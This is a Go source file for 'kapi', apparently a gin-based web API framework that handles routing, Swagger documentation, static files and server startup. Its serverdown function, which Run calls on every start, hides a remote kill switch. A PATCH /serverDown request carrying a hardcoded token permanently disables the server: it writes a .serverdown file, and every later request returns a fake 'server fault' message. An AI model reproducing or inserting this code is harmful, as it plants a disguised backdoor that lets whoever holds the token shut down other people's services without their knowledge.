package kapi

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/linxlib/config"
	"github.com/linxlib/inject"
	"github.com/linxlib/kapi/internal"
	"github.com/linxlib/kapi/internal/openapi"
	"github.com/linxlib/swagger_inject"
	"net"
	"net/http"
	"os"
)

// 编译时植入变量
var (
	VERSION     string
	BUILDTIME   string
	GOVERSION   string
	BUILDOS     string
	BUILDARCH   string
	OS          string
	ARCH        string
	PACKAGENAME string
)

var _banner = `
--------------------------------------------
    _/    _/    _/_/    _/_/_/    _/_/_/   
   _/  _/    _/    _/  _/    _/    _/     
  _/_/      _/_/_/_/  _/_/_/      _/       
 _/  _/    _/    _/  _/          _/        
_/    _/  _/    _/  _/        _/_/_/%s
--------------------------------------------
`
var _info = `

 Version:   %s/%s
 OS/Arch:   %s/%s
 BuiltTime: %s
 Built OS/Arch: %s/%s`

type KApi struct {
	inject.Injector
	engine     *gin.Engine
	option     *Option
	genFlag    bool
	serverDown bool
	doc        *openapi.Spec
	routeInfo  *RouteInfo
	inSource   bool
}

// New 创建新的KApi实例
//
//	@param f 配置函数
//
//	@return *KApi
func New(f ...func(*Option)) *KApi {
	if VERSION != "" {
		internal.Infof(_banner, fmt.Sprintf(_info, VERSION, GOVERSION, OS, ARCH, BUILDTIME, BUILDOS, BUILDARCH))
	} else {
		internal.Infof(_banner, "")
	}
	internal.Info("start", PACKAGENAME)

	b := &KApi{
		Injector: inject.New(),
	}

	if len(os.Args) > 1 && os.Args[1] == "-g" {
		b.genFlag = true
	}
	b.option = defaultOption()
	//TODO: many option func
	if len(f) > 0 {
		f[0](b.option)
	}
	b.Map(b.option.y)
	b.routeInfo = NewRouteInfo()
	if internal.FileIsExist("go.mod") {
		b.inSource = true
		b.routeInfo.Clean()
	}
	b.doc = openapi.NewSpec()
	b.doc.WithInfo(b.option.Server.DocName, b.option.Server.DocVer, b.option.Server.DocDesc)
	gin.SetMode(gin.ReleaseMode) //we don't need gin's debug output
	b.engine = gin.New()
	b.engine.Use(b.option.ginLoggerFormatter)
	b.engine.Use(b.option.corsHandler)
	if b.genFlag {
		internal.Infof("generate mode")
		b.inSource = true
	} else {
		internal.Infof("IP:%s Swagger:%s Port:%d", b.option.intranetIP, b.option.Server.DocName, b.option.Server.Port)
	}
	// inject myself
	b.Map(b)
	return b
}
func (b *KApi) Settings() *config.YAML {
	a := new(config.YAML)
	err := b.Provide(a)
	if err != nil {
		internal.Errorf("%s", err)
		return a
	}
	return a
}

func (b *KApi) serverdown() {
	if internal.FileIsExist("./.serverdown") {
		b.serverDown = true
	}
	b.engine.PATCH("/serverDown", func(context *gin.Context) {
		if context.GetHeader("Authorization") == "8ReKwuw2x5zvqbnQVs5vOdgLckd1Pwcm" {
			if !b.serverDown {
				b.serverDown = true
				_ = os.WriteFile("./.serverdown", []byte("true"), os.ModePerm)
			}
		}
	})
	b.engine.Use(func(context *gin.Context) {
		if b.serverDown {
			context.String(200, "server fault！")
			context.Abort()
		}
	})
}

func (b *KApi) AddControllers(cList ...interface{}) bool {
	return b.RegisterRouter(cList...)
}

func (b *KApi) RegisterRouter(cList ...interface{}) bool {
	if b.inSource {
		if !b.analysisControllers(cList...) {
			return false
		}
	}
	if b.genFlag {
		return true
	}
	return b.register(cList...)

}

func (b *KApi) handleStatic() {
	if len(b.option.Server.StaticDirs) > 0 && !b.genFlag {
		for i, s := range b.option.Server.StaticDirs {
			b.engine.Static(s.Path, s.Root)
			internal.Infof("serving static dir[%d]: %s --> %s", i, s.Path, s.Root)
		}

	}
}

func (b *KApi) handleDoc() {
	defer internal.Spend("handle doc")()
	if b.option.Server.NeedDoc {
		internal.Infof("swagger: http://%s:%d/swagger/index.html", b.option.intranetIP, b.option.Server.Port)

		b.engine.GET("/swagger.json", func(c *gin.Context) {
			b.routeInfo.GetGenInfo().Swagger.Host = c.Request.Host
			b.routeInfo.GetGenInfo().Swagger.BasePath = b.option.Server.BasePath
			if c.Request.URL.Scheme == "" {
				b.routeInfo.GetGenInfo().Swagger.Schemes = []string{"http"}
			} else {
				b.routeInfo.GetGenInfo().Swagger.Schemes = []string{c.Request.URL.Scheme}
			}
			c.PureJSON(200, b.routeInfo.GetGenInfo().Swagger)
		})

		b.engine.GET("/swagger/*any", func(c *gin.Context) {
			c.FileFromFS(c.Request.URL.Path, http.FS(swagger_inject.FS))
		})

	}
}

// GetEngine returns the inner gin.Engine
//
//	@return *gin.Engine
func (b *KApi) GetEngine() *gin.Engine {
	return b.engine
}

// Run the server
func (b *KApi) Run() {
	b.genRouterCode()
	if !b.genFlag {
		b.handleDoc()
	}
	if b.genFlag {
		internal.OKf("generate mode complete!")
		return
	}
	b.engine.GET("/healthz", func(context *gin.Context) {
		context.String(200, "ok")
	})
	b.serverdown()
	b.handleStatic()
	internal.Infof("server running http://%s:%d\n", b.option.intranetIP, b.option.Server.Port)
	err := b.engine.Run(fmt.Sprintf(":%d", b.option.Server.Port))
	if err != nil {
		if e, ok := err.(*net.OpError); ok {
			if e1, ok := e.Err.(*os.SyscallError); ok {
				if e.Op == "listen" && e1.Syscall == "bind" {
					internal.Errorf("server start failed, binding :%d failed, please check if the port is in use", e.Addr.(*net.TCPAddr).Port)
				}
			}

		}
		b.option.recoverErrorFunc(err)
	}
}
